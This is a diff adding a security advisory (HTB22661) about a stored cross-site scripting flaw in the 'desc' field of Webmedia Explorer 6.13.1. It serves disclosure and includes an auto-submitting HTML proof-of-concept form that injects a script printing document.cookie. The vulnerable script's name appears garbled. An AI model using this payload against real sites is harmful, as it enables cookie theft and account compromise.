@@ -1,0 +1,31 @@
+Vulnerability ID: HTB22661
+Reference: http://www.htbridge.ch/advisory/stored_xss_vulnerability_in_webmedia_explorer.html
+Product: Webmedia Explorer
+Vendor: Marc Salmurri ( http://www.webmediaexplorer.com/ ) 
+Vulnerable Version: 6.13.1 and probably prior versions
+Vendor Notification: 19 October 2010 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "6.13.1!">" script to properly sanitize user-supplied input in "desc" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/folder" method="post" name="main">
+<input type="hidden" name="object" value="folder">
+<input type="hidden" name="desc" value='title"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="tags" value="">
+<input type="hidden" name="position" value="">
+<input type="hidden" name="readme" value="post txt">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
